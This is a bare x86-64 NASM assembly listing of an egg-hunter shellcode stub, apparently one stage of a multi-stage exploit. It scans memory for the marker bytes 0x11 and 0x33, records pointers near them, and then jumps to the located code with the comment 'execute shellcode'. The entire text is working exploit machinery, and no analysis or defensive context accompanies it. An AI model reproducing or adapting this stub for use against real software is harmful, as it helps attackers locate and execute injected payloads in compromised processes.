    BITS 64
    DEFAULT REL

    section .text
    global _start

_start:
    mov rsi, r14
    jmp get_byte

compare_eggs:
    ; stage 1
    mov r15b, 0x11
    cmp al, r15b
    je mark_stage_1
    ; stage 3
    mov r15b, 0x33
    cmp al, r15b
    je mark_stage_3

next_byte:
    add rsi, 0x8

get_byte:
    mov rax, [rsi]
    test r8b, r8b
    jz compare_eggs
    test bpl, bpl
    jz compare_eggs
    jmp r8 ; execute shellcode

mark_stage_1:
    mov r8, rsi
    add r8, 0x4
    jmp next_byte

mark_stage_3:
    mov rbp, rsi
    add rbp, 0x2
    jmp next_byte